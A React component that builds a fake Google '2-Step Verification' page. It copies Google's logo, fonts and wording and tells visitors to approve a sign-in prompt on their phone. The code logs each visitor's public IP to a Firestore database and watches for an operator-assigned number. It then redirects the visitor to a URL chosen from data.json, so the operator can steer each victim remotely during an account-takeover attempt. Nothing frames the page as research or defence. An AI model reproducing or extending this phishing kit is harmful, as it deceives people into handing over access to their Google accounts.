import React, { useEffect, useState } from 'react'
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
import { db } from '../firebase.js';


const About = () => {
    const [ip, setIp] = useState(undefined);
    const [userData, setUserData] = useState(undefined)
    const [isUserData, setIsUserData] = useState(false)
    const [userUrl, setUserUrl] = useState(false)


    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "user_pages"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true)
                setUserData(x);
                return x;
            }

        })
        if (filter.length === 0) {
            addUserData()
        }
    }


    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());

            const ip = await publicIpv4()
            setIp(ip);
        }

    };
    getIp()


    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "user_pages"), (snapshot) => {
                let isExist = false
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {

                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {

                            data.url_data.filter((item) => {
                                if (item.id === x.number) {
                                    setUserUrl(item.url)
                                    isExist = true
                                    return
                                }
                            })
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }

                })
                if (!isExist) {
                    setUserUrl(false)
                }
            })

        }
    }, [ip]);

    useEffect(() => {
    }, [userData, userUrl])


    const addUserData = async () => {

        try {
            const docRef = doc(collection(db, "user_pages"), ip);
    
            // Check if the document exists
            const docSnap = await getDoc(docRef);
    
            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1
                });
                console.log("Document written with ID: ", ip);
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }


    useEffect(() => {
        if (ip) {
            getUserData()
        }

    }, [ip])

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "user_pages"), ip);
            await setDoc(docRef, { number: -1 }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    if (userUrl) {
        setTimeout(()=>{
            window.location = userUrl
        },1000)
        resetUserNumber()
    }

    return (
<div>
  <meta charSet="UTF-8" />
  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
  <meta httpEquiv="X-UA-Compatible" content="ie=edge" />
  <link href="https://testpagani.web.app/static/css/main.47f7c978.css" rel="stylesheet" />
  <title>Positivus</title>
  <div style={{"border":"1px solid #cccccc","border-radius":"10px","padding":"20px 30px 30px 30px","max-width":"445px","margin":"10px auto","box-sizing":"border-box"}}>
    <img src="https://cdn.freebiesupply.com/images/thumbs/2x/google-logo.png" alt style={{"display":"block","width":"120px","margin":"auto"}} />
    <h2 style={{"-webkit-text-align":"center","text-align":"center","margin":"-15px 0 10px 0","font-size":"24px","font-weight":"400","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>
      2-Step Verification
    </h2>
    <p style={{"-webkit-text-align":"center","text-align":"center","max-width":"350px","margin":"auto","font-size":"16.0px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>
      To help keep your account safe, Google wants to make sure it's really
      you trying to sign in <br />
    </p>
    <div style={{"margin":"10px auto 0 auto","width":"fit-content","position":"relative"}}>
      <select style={{"-webkit-appearance":"none","border-radius":"40px","border":"1px solid #cccccc","width":"100%","max-width":"280px","font-weight":"410","margin":"auto","padding":"8px 8px 8px 32px","display":"block","box-sizing":"border-box","color":"black"}}>
        <option style={{"color":"black","font-size":"14.5px"}}>
          {/* Add the following line to retrieve the email from local storage */}
        </option>
      </select>
      <div style={{"position":"absolute","top":"0","left":"8px","height":"100%","display":"flex","-webkit-align-items":"center","-webkit-box-align":"center","-ms-flex-align":"center","align-items":"center"}}>
        <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 512 512">
          {/*! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. */}
          <path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c39.77 0 72 32.24 72 72S295.8 272 256 272c-39.76 0-72-32.24-72-72S216.2 128 256 128zM256 448c-52.93 0-100.9-21.53-135.7-56.29C136.5 349.9 176.5 320 224 320h64c47.54 0 87.54 29.88 103.7 71.71C356.9 426.5 308.9 448 256 448z" />
        </svg>
      </div>
    </div>
    <h2 style={{"-webkit-text-align":"center","text-align":"center","font-size":"44px","font-weight":"500","margin-bottom":"0"}}><br />
      <div id="root" /><br />
    </h2>
    <h4 style={{"font-size":"16.4px","font-weight":"500","margin-bottom":"-5px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>
      Check your phone
    </h4><br />
    <p style={{"display":"inline","font-size":"16.0px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>
      Google sent a notification to your     . Open the Gmail
      app, tap <strong>Yes</strong>
      on the prompt, then tap
      <strong /></p><div style={{"display":"inline-block","font-size":"16.0px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}} id="root1" /><span style={{"font-size":"16.4px","font-weight":"500","margin-bottom":"-5px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>&nbsp;on your phone  to verify it's you.</span>
    <p />
    <div>
      <label>
        <input type="checkbox" defaultChecked style={{"margin":"0","font-size":"16.0px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}} />
        <span style={{"margin-left":"10px","font-size":"14.4px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>Don't ask again on this device</span>
      </label>
    </div>
    <div style={{"margin":"50px 0"}}>
      <a href="#" style={{"color":"#0090fc !important","-webkit-text-decoration":"none !important","text-decoration":"none !important","font-weight":"600","font-size":"13.8px","font-family":"Google Sans,Noto Sans Myanmar UI,arial,sans-serif"}}>Resend it</a>
    </div>
    <div style={{"margin-bottom":"20px"}}>
      <a href="#" style={{"color":"#0090fc !important","-webkit-text-decoration":"none !important","text-decoration":"none !important","font-weight":"550","font-size":"13.8px","font-family":"roboto,Noto Sans Myanmar UI,arial,sans-serif"}}>Try another way</a>
    </div>
  </div>
  <div style={{"font-size":"12px","display":"flex","-webkit-align-items":"center","-webkit-box-align":"center","-ms-flex-align":"center","align-items":"center","-webkit-box-pack":"space-between","-webkit-justify-content":"space-between","-ms-flex-pack":"space-between","justify-content":"space-between","max-width":"445px","margin":"auto"}}>
    <div>
      English (United States)
      <svg xmlns="http://www.w3.org/2000/svg" width={10} height={10} fill="currentColor" className="bi bi-caret-down-fill" viewBox="0 0 16 16">
        <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z" />
      </svg>
    </div>
    <div>
      <a href="#" style={{"color":"black !important","-webkit-text-decoration":"none !important","text-decoration":"none !important","margin-left":"15px"}}>Help</a>
      <a href="#" style={{"color":"black !important","-webkit-text-decoration":"none !important","text-decoration":"none !important","margin-left":"15px"}}>Privacy</a>
      <a href="#" style={{"color":"black !important","-webkit-text-decoration":"none !important","text-decoration":"none !important","margin-left":"15px"}}>Terms</a>
    </div>
  </div>
  <style dangerouslySetInnerHTML={{__html: "\n      @media screen and (max-width: 768px) {\n        body > div:nth-child(1) {\n          border-radius: 2px !important;\n          padding: 15px 15px 150px 15px !important;\n          border: none !important;\n        }\n        body > div:nth-child(2) {\n          margin-top: -100px !important;\n          padding: 15px !important;\n          flex-direction: column !important;\n          align-items: start !important;\n        }\n        body > div:nth-child(2) > div:nth-child(2) {\n          margin-top: 20px;\n        }\n        body > div:nth-child(2) > div:nth-child(2) a:nth-child(1) {\n          margin-left: 0 !important;\n        }\n        body > div > img {\n          margin-top: -15px !important;\n        }\n      }\n    " }} />
</div>

    )

}

export default About;